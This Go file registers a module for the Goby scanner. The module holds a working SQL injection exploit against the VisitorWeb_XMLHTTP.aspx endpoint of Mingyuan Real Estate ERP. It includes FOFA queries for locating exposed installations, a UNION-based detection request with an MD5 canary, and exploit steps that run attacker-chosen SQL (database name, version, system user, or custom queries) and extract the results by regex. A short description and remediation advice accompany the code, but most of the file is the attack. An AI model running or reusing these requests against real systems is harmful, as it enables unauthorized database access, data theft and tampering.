package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Mingyuan Real Estate ERP System /CgZtbWeb/VisitorWeb/VisitorWeb_XMLHTTP.aspx SQL Injection Vulnerability",
    "Description": "<p>Mingyuan Cloud ERP is an enterprise resource planning (ERP) system specifically designed for the real estate industry, integrating multiple modules such as financial management, project management, contract management, procurement management, and sales management. The interface VisitorWeb_XMLHTTP.aspx of this system has a SQL injection vulnerability, allowing attackers to construct malicious SQL statements to directly execute database operations and echo the results in the response package, potentially leading to sensitive data leakage or database tampering.</p>",
    "Product": "Mingyuan Cloud ERP",
    "Homepage": "https://www.mingyuanyun.com/",
    "DisclosureDate": "2023-08-16",
    "PostTime": "2024-12-24",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "body=\"hibot.js\"||body=\".hibot\"||body=\"f96699bbadafca894f3c1b7a\"||body=\"明源云ERP\"||title=\"明源云ERP\"||title=\"明源地产ERP\"||(body=\"window.location.replace('/_base/Home/Error/browser.html?enablemip=0');\"&&body=\"深圳市明源云科技有限公司\")",
    "GobyQuery": "body=\"hibot.js\"||body=\".hibot\"||body=\"f96699bbadafca894f3c1b7a\"||body=\"明源云ERP\"||title=\"明源云ERP\"||title=\"明源地产ERP\"||(body=\"window.location.replace('/_base/Home/Error/browser.html?enablemip=0');\"&&body=\"深圳市明源云科技有限公司\")",
    "Level": "2",
    "Impact": "<p>This vulnerability allows attackers to directly access and manipulate the database through SQL injection, potentially causing sensitive data leakage, data tampering, or system service interruptions.</p>",
    "Recommendation": "<p>It is recommended to immediately fix the SQL injection vulnerability by using parameterized queries or prepared statements to handle user input and avoid directly concatenating SQL statements. Additionally, it is advised to strictly validate input data and restrict database user permissions to prevent malicious operations.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/zWRWvxfNON5AMJzFKc2kTQ?token=47382160&lang=zh_CN"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "SELECT DB_NAME(),SELECT @@VERSION,SELECT SYSTEM_USER",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT DB_NAME()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/CgZtbWeb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ywtype=GetParentProjectName&ParentCode=1%27+UNION+ALL+SELECT+CHAR%28126%29%2BCHAR%28126%29%2BCHAR%28126%29%2B%28select+sys.fn_sqlvarbasetostr%28HashBytes%28%27MD5%27%2C%27{{{rand_int}}}%27%29%29%29%2BCHAR%28126%29%2BCHAR%28126%29%2BCHAR%28126%29--+KVVs",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "ASP.NET_SessionId=sosgrp45hqkdt4f0rrog3445"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{{{rand_int_md5}}}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/CgZtbWeb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ywtype=GetParentProjectName&ParentCode=1%27+UNION+ALL+SELECT+CHAR%28126%29%2BCHAR%28126%29%2BCHAR%28126%29%2B%28{{{payload_encode}}}%29%2BCHAR%28126%29%2BCHAR%28126%29%2BCHAR%28126%29--+KVVs",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "ASP.NET_SessionId=sosgrp45hqkdt4f0rrog3445"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "~~~payload~~~",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~~~([^'][\\s\\S]*?)~~~",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "明源地产ERP系统 /CgZtbWeb/VisitorWeb/VisitorWeb_XMLHTTP.aspx SQL 注入漏洞",
            "Product": "明源云ERP",
            "Description": "<p>明源云ERP是一款专门为房地产行业设计的企业资源计划（ERP）系统，集成了财务管理、项目管理、合同管理、采购管理、销售管理等多个模块。该系统的接口 VisitorWeb_XMLHTTP.aspx 存在 SQL 注入漏洞，攻击者可以通过构造恶意 SQL 语句直接执行数据库操作，并将结果回显到响应包中，可能导致敏感数据泄露或数据库被篡改。</p>",
            "Recommendation": "<p>建议立即修复 SQL 注入漏洞，采用参数化查询或预编译语句来处理用户输入，避免直接拼接 SQL 语句。同时，建议对输入数据进行严格的合法性校验，并限制数据库用户的权限，防止恶意操作。</p>",
            "Impact": "<p>该漏洞允许攻击者通过 SQL 注入直接访问和操作数据库，可能导致敏感数据泄露、数据篡改或系统服务中断等严重后果。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Mingyuan Real Estate ERP System /CgZtbWeb/VisitorWeb/VisitorWeb_XMLHTTP.aspx SQL Injection Vulnerability",
            "Product": "Mingyuan Cloud ERP",
            "Description": "<p>Mingyuan Cloud ERP is an enterprise resource planning (ERP) system specifically designed for the real estate industry, integrating multiple modules such as financial management, project management, contract management, procurement management, and sales management. The interface VisitorWeb_XMLHTTP.aspx of this system has a SQL injection vulnerability, allowing attackers to construct malicious SQL statements to directly execute database operations and echo the results in the response package, potentially leading to sensitive data leakage or database tampering.</p>",
            "Recommendation": "<p>It is recommended to immediately fix the SQL injection vulnerability by using parameterized queries or prepared statements to handle user input and avoid directly concatenating SQL statements. Additionally, it is advised to strictly validate input data and restrict database user permissions to prevent malicious operations.</p>",
            "Impact": "<p>This vulnerability allows attackers to directly access and manipulate the database through SQL injection, potentially causing sensitive data leakage, data tampering, or system service interruptions.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "payload_encode": "define|query_encode|{{{payload}}}",
        "rand_int": "define|variable|{{{rand|int|8}}}",
        "rand_int_md5": "define|md5|{{{rand_int}}}",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/CgZtbWeb/VisitorWeb/VisitorWeb_XMLHTTP.aspx"
    },
    "VariablesOrder": [
        "payload",
        "payload_encode",
        "rand_int",
        "rand_int_md5",
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9980"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}